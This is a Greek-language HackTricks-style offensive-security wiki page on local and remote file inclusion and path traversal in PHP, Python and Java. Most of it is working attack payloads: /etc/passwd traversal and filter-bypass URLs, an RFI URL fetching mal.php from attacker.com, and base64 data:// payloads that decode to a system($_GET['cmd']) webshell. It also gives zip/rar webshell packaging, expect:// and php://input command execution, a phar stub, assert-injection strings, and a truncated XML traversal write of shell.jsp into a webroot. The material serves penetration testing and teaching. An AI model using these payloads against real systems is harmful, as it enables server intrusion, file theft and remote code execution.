# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Το αρχείο φορτώνεται από απομακρυσμένο διακομιστή (Καλύτερο: Μπορείτε να γράψετε τον κώδικα και ο διακομιστής θα τον εκτελέσει). Στο php αυτό είναι **απενεργοποιημένο** από προεπιλογή (**allow_url_include**).\
**Local File Inclusion (LFI):** Ο διακομιστής φορτώνει ένα τοπικό αρχείο.

Η ευπάθεια προκύπτει όταν ο χρήστης μπορεί με κάποιον τρόπο να ελέγξει το αρχείο που πρόκειται να φορτώσει ο διακομιστής.

Ευπαθείς **PHP συναρτήσεις**: require, require_once, include, include_once

Ένα ενδιαφέρον εργαλείο για την εκμετάλλευση αυτής της ευπάθειας: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Συνδυάζοντας διάφορες \*nix LFI λίστες και προσθέτοντας περισσότερες διαδρομές δημιούργησα αυτήν:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Δοκιμάστε επίσης να αλλάξετε `/` σε `\`\
Δοκιμάστε επίσης να προσθέσετε `../../../../../`

Μια λίστα που χρησιμοποιεί διάφορες τεχνικές για να βρει το αρχείο /etc/password (to check if the vulnerability exists) μπορεί να βρεθεί [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Συνένωση διαφορετικών wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Δοκιμάστε επίσης να αλλάξετε `/` σε `\`\
Δοκιμάστε επίσης να αφαιρέσετε `C:/` και να προσθέσετε `../../../../../`

Μια λίστα που χρησιμοποιεί διάφορες τεχνικές για να βρει το αρχείο /boot.ini (to check if the vulnerability exists) μπορεί να βρεθεί [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Ελέγξτε τη λίστα LFI του linux.

## Βασικά LFI και bypasses

Όλα τα παραδείγματα είναι για Local File Inclusion αλλά μπορούν επίσης να εφαρμοστούν σε Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### ακολουθίες traversal αφαιρεμένες μη αναδρομικά
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass της προσθήκης περισσότερων χαρακτήρων στο τέλος της δοθείσας συμβολοσειράς (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Αυτό έχει **διορθωθεί από το PHP 5.4**

### **Κωδικοποίηση**

Μπορείτε να χρησιμοποιήσετε μη τυπικές κωδικοποιήσεις όπως double URL encode (και άλλες):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Από υπάρχον φάκελο

Ίσως το back-end ελέγχει τη διαδρομή του φακέλου:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Εξερεύνηση καταλόγων του συστήματος αρχείων σε έναν διακομιστή

Το σύστημα αρχείων ενός διακομιστή μπορεί να εξερευνηθεί αναδρομικά για να εντοπιστούν κατάλογοι, όχι μόνο αρχεία, χρησιμοποιώντας ορισμένες τεχνικές. Αυτή η διαδικασία περιλαμβάνει τον προσδιορισμό του βάθους των καταλόγων και τη διερεύνηση για την ύπαρξη συγκεκριμένων φακέλων. Παρακάτω ακολουθεί μια λεπτομερής μέθοδος για να το πετύχετε:

1. **Καθορισμός βάθους καταλόγου:** Προσδιορίστε το βάθος του τρέχοντος καταλόγου σας ανακτώντας επιτυχώς το `/etc/passwd` αρχείο (ισχύει αν ο διακομιστής είναι βασισμένος σε Linux). Ένα παράδειγμα URL μπορεί να είναι δομημένο ως εξής, υποδεικνύοντας βάθος τρία:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Έλεγχος Φακέλων:** Πρόσθεσε το όνομα του ύποπτου φακέλου (π.χ., `private`) στο URL, στη συνέχεια πλοηγήσου πίσω στο `/etc/passwd`. Το επιπλέον επίπεδο καταλόγου απαιτεί να αυξήσεις το depth κατά ένα:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Ερμηνεία των Αποτελεσμάτων:** Η απάντηση του διακομιστή υποδεικνύει εάν ο φάκελος υπάρχει:
- **Σφάλμα / Καμία Έξοδος:** Ο φάκελος `private` πιθανότατα δεν υπάρχει στην καθορισμένη τοποθεσία.
- **Περιεχόμενα του `/etc/passwd`:** Η παρουσία του φακέλου `private` επιβεβαιώνεται.
4. **Αναδρομική Εξερεύνηση:** Οι εντοπισμένοι φάκελοι μπορούν να διερευνηθούν περαιτέρω για υποφακέλους ή αρχεία χρησιμοποιώντας την ίδια τεχνική ή τις παραδοσιακές μεθόδους Local File Inclusion (LFI).

Για την εξερεύνηση καταλόγων σε διαφορετικές τοποθεσίες στο σύστημα αρχείων, προσαρμόστε το payload ανάλογα. Για παράδειγμα, για να ελέγξετε αν το `/var/www/` περιέχει έναν φάκελο `private` (υποθέτοντας ότι ο τρέχων κατάλογος βρίσκεται σε βάθος 3), χρησιμοποιήστε:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Το Path truncation είναι μια μέθοδος που χρησιμοποιείται για τον χειρισμό μονοπατιών αρχείων σε web εφαρμογές. Συχνά χρησιμοποιείται για πρόσβαση σε περιορισμένα αρχεία παρακάμπτοντας ορισμένα μέτρα ασφαλείας που προσθέτουν επιπλέον χαρακτήρες στο τέλος των μονοπατιών αρχείων. Ο στόχος είναι να δημιουργηθεί ένα μονοπάτι αρχείου που, όταν τροποποιηθεί από το μέτρο ασφαλείας, εξακολουθεί να δείχνει στο επιθυμητό αρχείο.

Στην PHP, διάφορες αναπαραστάσεις ενός μονοπατιού αρχείου μπορούν να θεωρηθούν ισοδύναμες λόγω της φύσης του συστήματος αρχείων. Για παράδειγμα:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, και `/etc/passwd/` αντιμετωπίζονται όλα ως το ίδιο μονοπάτι.
- Όταν οι τελευταίοι 6 χαρακτήρες είναι `passwd`, η προσθήκη ενός `/` (κάνοντας το `passwd/`) δεν αλλάζει το στοχοθετημένο αρχείο.
- Παρομοίως, αν το `.php` προστεθεί σε ένα μονοπάτι αρχείου (όπως `shellcode.php`), η προσθήκη ενός `/.` στο τέλος δεν θα αλλάξει το αρχείο στο οποίο γίνεται πρόσβαση.

Τα παραδείγματα που ακολουθούν δείχνουν πώς να χρησιμοποιήσετε το path truncation για πρόσβαση στο `/etc/passwd`, έναν συνηθισμένο στόχο λόγω του ευαίσθητου περιεχομένου του (πληροφορίες λογαριασμών χρηστών):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Σε αυτά τα σενάρια, ο αριθμός των traversals που απαιτούνται μπορεί να είναι περίπου 2027, αλλά αυτός ο αριθμός μπορεί να διαφέρει ανάλογα με τη διαμόρφωση του διακομιστή.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) σε συνδυασμό με επιπλέον dot segments και χαρακτήρες μπορούν να χρησιμοποιηθούν για πλοήγηση στο σύστημα αρχείων, αγνοώντας στην πράξη τις συμβολοσειρές που προστίθενται από τον διακομιστή.
- **Determining the Required Number of Traversals**: Μέσω δοκιμής και λάθους, μπορεί κανείς να βρει τον ακριβή αριθμό `../` ακολουθιών που απαιτούνται για να φτάσει στον ριζικό κατάλογο και στη συνέχεια στο `/etc/passwd`, εξασφαλίζοντας ότι τυχόν προστιθέμενες συμβολοσειρές (όπως `.php`) εξουδετερώνονται αλλά η επιθυμητή διαδρομή (`/etc/passwd`) παραμένει ανέπαφη.
- **Starting with a Fake Directory**: Είναι κοινή πρακτική να ξεκινά η διαδρομή με έναν ανύπαρκτο κατάλογο (όπως `a/`). Αυτή η τεχνική χρησιμοποιείται ως προληπτικό μέτρο ή για να ικανοποιήσει τις απαιτήσεις της λογικής ανάλυσης διαδρομών του διακομιστή.

When employing path truncation techniques, it's crucial to understand the server's path parsing behavior and filesystem structure. Each scenario might require a different approach, and testing is often necessary to find the most effective method.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

Στο php αυτό είναι απενεργοποιημένο από προεπιλογή επειδή **`allow_url_include`** είναι **Off.** Πρέπει να είναι **On** για να λειτουργήσει, και σε αυτή την περίπτωση μπορείτε να συμπεριλάβετε ένα αρχείο PHP από τον διακομιστή σας και να αποκτήσετε RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Εάν για κάποιο λόγο **`allow_url_include`** είναι **On**, αλλά το PHP φιλτράρει την πρόσβαση σε εξωτερικές ιστοσελίδες, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), μπορείτε για παράδειγμα να χρησιμοποιήσετε το data protocol με base64 για να αποκωδικοποιήσετε έναν b64 PHP κώδικα και να πετύχετε RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Στον προηγούμενο κώδικα, το τελικό `+.txt` προστέθηκε επειδή ο επιτιθέμενος χρειαζόταν ένα string που τελείωνε σε `.txt`, οπότε το string τελειώνει με αυτό και μετά το b64 decode αυτό το κομμάτι θα επιστρέψει μόνο junk και ο πραγματικός PHP κώδικας θα συμπεριληφθεί (και επομένως, εκτελεστεί).

Ένα ακόμη παράδειγμα **που δεν χρησιμοποιεί το `php://` πρωτόκολλο** θα ήταν:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Root στοιχείο

Στον python, σε έναν κώδικα σαν αυτόν:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Εάν ο χρήστης περάσει μια **απόλυτη διαδρομή** στο **`file_name`**, η **προηγούμενη διαδρομή απλώς αφαιρείται**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Αυτή είναι η αναμενόμενη συμπεριφορά σύμφωνα με [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Εάν ένα στοιχείο είναι μια απόλυτη διαδρομή, όλα τα προηγούμενα στοιχεία απορρίπτονται και η σύνδεση συνεχίζεται από το στοιχείο της απόλυτης διαδρομής.

## Java Λίστα καταλόγων

Φαίνεται πως αν έχεις ένα Path Traversal σε Java και ζητήσεις **ένα directory** αντί για ένα **file**, επιστρέφεται **λίστα του directory**. Αυτό δεν συμβαίνει σε άλλες γλώσσες (όσο γνωρίζω).

## Κορυφαίες 25 παράμετροι

Ακολουθεί λίστα με τις κορυφαίες 25 παραμέτρους που θα μπορούσαν να είναι ευάλωτες σε local file inclusion (LFI) vulnerabilities (από [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI με χρήση PHP wrappers & protocols

### php://filter

Οι PHP filters επιτρέπουν την εκτέλεση βασικών **ενεργειών τροποποίησης στα δεδομένα** πριν αυτά διαβαστούν ή γραφτούν. Υπάρχουν 5 κατηγορίες φίλτρων:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Αφαιρεί tags από τα δεδομένα (ό,τι βρίσκεται ανάμεσα στους χαρακτήρες "<" και ">")
- Σημειώστε ότι αυτό το filter έχει εξαφανιστεί από τις σύγχρονες εκδόσεις της PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Μετατρέπει σε διαφορετική κωδικοποίηση (`convert.iconv.<input_enc>.<output_enc>`). Για να πάρετε τη **λίστα με όλες τις κωδικοποιήσεις** που υποστηρίζονται, τρέξτε στην κονσόλα: `iconv -l`

> [!WARNING]
> Με κατάχρηση του φίλτρου μετατροπής `convert.iconv.*` μπορείτε να **παράξετε αυθαίρετο κείμενο**, κάτι που μπορεί να είναι χρήσιμο για να γράψετε αυθαίρετο κείμενο ή να κάνετε μια συνάρτηση όπως το include να επεξεργαστεί αυθαίρετο κείμενο. Για περισσότερα, δείτε [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Συμπιέζει το περιεχόμενο (χρήσιμο σε περίπτωση exfiltrating μεγάλου όγκου πληροφοριών)
- `zlib.inflate`: Αποσυμπιέζει τα δεδομένα
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Other Filters
- Εκτελώντας σε php `var_dump(stream_get_filters());` μπορείτε να βρείτε μερικά **αναπάντεχα filters**:
- `consumed`
- `dechunk`: αντιστρέφει το HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Το μέρος "php://filter" δεν κάνει διάκριση πεζών/κεφαλαίων

### Using php filters as oracle to read arbitrary files

[**Σε αυτό το άρθρο**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) προτείνεται μια τεχνική για να διαβάσετε ένα local file χωρίς να επιστραφεί το output από τον server. Αυτή η τεχνική βασίζεται σε μια **boolean exfiltration of the file (char by char) using php filters** ως oracle. Αυτό συμβαίνει επειδή php filters μπορούν να χρησιμοποιηθούν για να κάνουν ένα κείμενο τόσο μεγάλο ώστε να προκαλέσει exception στο php.

Στην αρχική ανάρτηση θα βρείτε αναλυτική εξήγηση της τεχνικής, αλλά εδώ είναι μια σύντομη περίληψη:

- Use the codec **`UCS-4LE`** για να αφήσετε τον πρώτο χαρακτήρα του κειμένου στην αρχή και να κάνετε το μέγεθος της string να αυξάνεται εκθετικά.
- Αυτό θα χρησιμοποιηθεί για να παραχθεί ένα **text so big when the initial letter is guessed correctly** που το php θα ενεργοποιήσει ένα **σφάλμα**
- Το φίλτρο **dechunk** θα **remove everything if the first char is not an hexadecimal**, έτσι μπορούμε να γνωρίζουμε αν ο πρώτος char είναι hex.
- Αυτό, σε συνδυασμό με το προηγούμενο (και με άλλα filters ανάλογα με το guessed letter), θα μας επιτρέψει να μαντέψουμε ένα γράμμα στην αρχή του κειμένου βλέποντας πότε κάνουμε αρκετές μετατροπές ώστε να μην είναι πλέον ένας hexadecimal character. Επειδή αν είναι hex, το dechunk δεν θα το διαγράψει και η αρχική βόμβα θα προκαλέσει php error.
- Ο codec **convert.iconv.UNICODE.CP930** μετατρέπει κάθε γράμμα στο επόμενο (οπότε μετά από αυτόν τον codec: a -> b). Αυτό μας επιτρέπει να ανακαλύψουμε αν ο πρώτος χαρακτήρας είναι `a` για παράδειγμα γιατί αν εφαρμόσουμε 6 αυτούς τους codecs a->b->c->d->e->f->g το γράμμα δεν είναι πλέον hexadecimal character, επομένως το dechunk δεν το διαγράφει και το php σφάλμα ενεργοποιείται επειδή πολλαπλασιάζεται με την αρχική βόμβα.
- Χρησιμοποιώντας άλλες μετατροπές όπως **rot13** στην αρχή είναι δυνατόν να leak άλλους chars όπως n, o, p, q, r (και άλλοι codecs μπορούν να χρησιμοποιηθούν για να μετακινήσουν άλλα γράμματα στην hex range).
- Όταν ο αρχικός char είναι αριθμός χρειάζεται να τον κωδικοποιήσουμε σε base64 και να leak τα πρώτα 2 γράμματα για να leak τον αριθμό.
- Το τελικό πρόβλημα είναι να δούμε **how to leak more than the initial letter**. Με τη χρήση order memory filters όπως **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** είναι δυνατή η αλλαγή της σειράς των chars και τοποθετούνται στην πρώτη θέση άλλα γράμματα του κειμένου.
- Και για να είναι δυνατή η απόκτηση **further data** η ιδέα είναι να **generate 2 bytes of junk data at the beginning** με **convert.iconv.UTF16.UTF16**, να εφαρμόσουμε **UCS-4LE** για να το **pivot with the next 2 bytes**, και d**elete the data until the junk data** (αυτό θα αφαιρέσει τα πρώτα 2 bytes του αρχικού κειμένου). Συνεχίστε έτσι μέχρι να φτάσετε στο επιθυμητό bit για να leak.

Στην ανάρτηση leaked και ένα εργαλείο για την αυτοματοποίηση αυτού: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Αυτό το wrapper επιτρέπει την πρόσβαση σε file descriptors που η διεργασία έχει open. Ενδεχομένως χρήσιμο για να exfiltrate το περιεχόμενο ανοιχτών αρχείων:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Μπορείτε επίσης να χρησιμοποιήσετε **php://stdin, php://stdout and php://stderr** για να αποκτήσετε πρόσβαση στους **περιγραφείς αρχείου 0, 1 και 2** αντίστοιχα (δεν είμαι σίγουρος πώς αυτό θα μπορούσε να είναι χρήσιμο σε επίθεση)

### zip:// και rar://

Ανεβάστε ένα αρχείο Zip ή Rar με ένα PHPShell μέσα και προσπελάστε το.\
Για να μπορείτε να καταχραστείτε το πρωτόκολλο rar, πρέπει **να ενεργοποιηθεί συγκεκριμένα**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Σημειώστε ότι αυτό το πρωτόκολλο περιορίζεται από τις ρυθμίσεις του php **`allow_url_open`** και **`allow_url_include`**

### expect://

Το expect πρέπει να είναι ενεργοποιημένο. Μπορείτε να εκτελέσετε code χρησιμοποιώντας αυτό:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Καθορίστε το payload στις παραμέτρους POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Ένα αρχείο `.phar` μπορεί να χρησιμοποιηθεί για την εκτέλεση κώδικα PHP όταν μια web εφαρμογή αξιοποιεί συναρτήσεις όπως `include` για τη φόρτωση αρχείων. Το παρακάτω απόσπασμα κώδικα PHP δείχνει τη δημιουργία ενός αρχείου `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Για να μεταγλωττιστεί το αρχείο `.phar`, θα πρέπει να εκτελεστεί η ακόλουθη εντολή:
```bash
php --define phar.readonly=0 create_path.php
```
Κατά την εκτέλεση, θα δημιουργηθεί ένα αρχείο με όνομα `test.phar`, το οποίο ενδέχεται να χρησιμοποιηθεί για την εκμετάλλευση ευπαθειών Local File Inclusion (LFI).

Σε περιπτώσεις όπου το LFI απλώς διαβάζει αρχεία χωρίς να εκτελεί τον PHP κώδικα που περιέχουν, μέσω συναρτήσεων όπως `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ή `filesize()`, μπορεί να επιχειρηθεί εκμετάλλευση deserialization vulnerability. Αυτή η ευπάθεια σχετίζεται με το διάβασμα αρχείων χρησιμοποιώντας το πρωτόκολλο `phar`.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Ήταν δυνατόν να καταχραστούν **any arbitrary file read from PHP that supports php filters** για να αποκτηθεί RCE. Η λεπτομερής περιγραφή μπορεί να [**βρεθεί σε αυτήν την ανάρτηση**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Πολύ σύντομη περίληψη: ένα **3 byte overflow** στο PHP heap εκμεταλλεύτηκε για να **alter the chain of free chunks** ενός συγκεκριμένου μεγέθους ώστε να είναι δυνατή η **write anything in any address**, οπότε προστέθηκε ένα hook που καλεί **`system`**.\
Ήταν δυνατόν να alloc chunks συγκεκριμένων μεγεθών καταχρώμενοι περισσότερα php filters.

### More protocols

Δείτε περισσότερα πιθανά[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Γραφή στη μνήμη ή σε ένα προσωρινό αρχείο (δεν είναι σαφές πώς αυτό μπορεί να είναι χρήσιμο σε μια file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Πρόσβαση στο τοπικό filesystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Πρόσβαση σε HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Πρόσβαση σε FTP URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Εύρεση pathnames που ταιριάζουν με μοτίβο (Δεν επιστρέφει τίποτα εκτυπώσιμο, οπότε δεν είναι πραγματικά χρήσιμο εδώ)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Δεν είναι χρήσιμο για ανάγνωση αυθαίρετων αρχείων)

## LFI via PHP's 'assert'

Οι κίνδυνοι Local File Inclusion (LFI) στην PHP είναι σημαντικά υψηλοί όταν εμπλέκεται η συνάρτηση 'assert', η οποία μπορεί να εκτελέσει κώδικα μέσα σε strings. Αυτό είναι ιδιαίτερα προβληματικό αν γίνεται έλεγχος εισόδου που περιέχει χαρακτήρες directory traversal όπως ".." αλλά δεν γίνεται σωστή απολύμανση.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Παρόλο που αυτό στοχεύει στο να σταματήσει το traversal, δημιουργεί άθελά του ένα διάνυσμα για code injection. Για να το εκμεταλλευτεί για την ανάγνωση του περιεχομένου αρχείων, ένας attacker θα μπορούσε να χρησιμοποιήσει:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Ομοίως, για την εκτέλεση αυθαίρετων εντολών συστήματος, μπορεί κανείς να χρησιμοποιήσει:
```plaintext
' and die(system("id")) or '
```
Είναι σημαντικό να **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Αυτή η τεχνική είναι σχετική σε περιπτώσεις όπου εσείς **control** το **file path** μίας **PHP function** που θα **access a file** αλλά δεν θα δείτε το περιεχόμενο του αρχείου (π.χ. μια απλή κλήση σε **`file()`**) καθώς το περιεχόμενο δεν εμφανίζεται.

Στο [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) εξηγείται πώς ένα blind path traversal μπορεί να καταχραστεί μέσω PHP filter για να **exfiltrate** το περιεχόμενο ενός αρχείου μέσω ενός error oracle.

Εν συντομία, η τεχνική χρησιμοποιεί την κωδικοποίηση **"UCS-4LE"** για να κάνει το περιεχόμενο ενός αρχείου τόσο **μεγάλο** ώστε η **PHP function που ανοίγει** το αρχείο να προκαλέσει ένα **error**.

Έπειτα, για να leak ο πρώτος χαρακτήρας χρησιμοποιείται ο filter **`dechunk`** μαζί με άλλους όπως **base64** ή **rot13** και τελικά χρησιμοποιούνται οι φίλτροι **convert.iconv.UCS-4.UCS-4LE** και **convert.iconv.UTF16.UTF-16BE** για να τοποθετήσουν άλλους χαρακτήρες στην αρχή και να γίνει leak αυτών.

Συναρτήσεις που ενδέχεται να είναι ευάλωτες: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Για τις τεχνικές λεπτομέρειες δείτε το προαναφερθέν post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Όταν ο server-side κώδικας που ingest/uploads αρχεία κατασκευάζει το destination path χρησιμοποιώντας δεδομένα που ελέγχονται από τον χρήστη (π.χ., ένα filename ή URL) χωρίς canonicalising και validating, τμήματα `..` και absolute paths μπορούν να ξεφύγουν από τον προοριζόμενο κατάλογο και να προκαλέσουν arbitrary file write. Αν μπορείτε να τοποθετήσετε το payload κάτω από έναν web-exposed directory, συνήθως αποκτάτε unauthenticated RCE με το να dropάρετε ένα webshell.

Τυπική ροή εκμετάλλευσης:
- Εντοπίστε ένα write primitive σε ένα endpoint ή background worker που δέχεται ένα path/filename και γράφει περιεχόμενο στο disk (π.χ., message-driven ingestion, XML/JSON command handlers, ZIP extractors, κ.λπ.).
- Προσδιορίστε web-exposed directories. Συνηθισμένα παραδείγματα:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Κατασκευάστε ένα traversal path που βγαίνει από τον προοριζόμενο storage directory προς το webroot, και συμπεριλάβετε το περιεχόμενο του webshell.
- Περιηγηθείτε στο dropped payload και εκτελέστε εντολές.

Σημειώσεις:
- Η ευάλωτη υπηρεσία που πραγματοποιεί την εγγραφή μπορεί να ακούει σε μια μη-HTTP θύρα (π.χ., ένας JMF XML listener σε TCP 4004). Το κύριο web portal (σε διαφορετική θύρα) θα σερβίρει αργότερα το payload σας.
- Σε Java stacks, αυτές οι εγγραφές αρχείων συχνά υλοποιούνται με απλή concatenation `File`/`Paths`. Η έλλειψη canonicalisation/allow-listing είναι το βασικό σφάλμα.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
